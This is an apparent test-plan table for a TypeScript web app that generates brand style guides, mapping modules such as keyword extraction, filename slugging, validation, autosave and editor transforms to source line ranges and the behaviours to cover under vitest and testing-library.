| `lib/extraction.ts` | use-extraction.ts:12-218, 311-338, 417-467; CreateGuideModal.tsx:76-264 | keywords array passthrough / string split on `\n`/`,` trimmed; productsServices only if array; top-3 auto traits; empty traits clears `selectedTraits` (FE-8); description >200 chars clipped only for descriptions; one `classifyExtractionError` table (status 429/402, AbortError, message keywords) |
| `lib/guide-files.ts` | 5 filename variants | `guideSlug("Acme Co")==="acme-co"`; missing name → `"style"`; strips `/\:*?"<>|`; preview suffix |
| `lib/brand-details.ts` | brand-details:342-417 | `validateStep1` messages; `validateKeyword`; `normalizeBrandName` keeps Unicode (FE-18); formality legacy numeric → label migration (`:158-163`) |
| `lib/progress.ts` | guide/page.tsx:358-376 | fake timers: monotonic, clamps at end, cleanup stops updates |
| `hooks/use-autosave.ts` | guide/page.tsx:668-695 | FE-4 list (debounce, flush on unmount, abort previous, real plan_type) |
| `hooks/use-guide.ts` (tier) | use-guide.ts:116-131 | FE-6 remount refetch; logout resets to starter |
| `components/editor/transforms.ts` | 66-141 | FE-11 classic list conversion + `getBlockType` round-trip |

All of the above run under the existing vitest + jsdom + @testing-library setup; hooks via `renderHook` from `@testing-library/react`, mocking `next/navigation`, `@/components/AuthProvider` (`useAuth`) and `global.fetch` with `vi.fn()`.
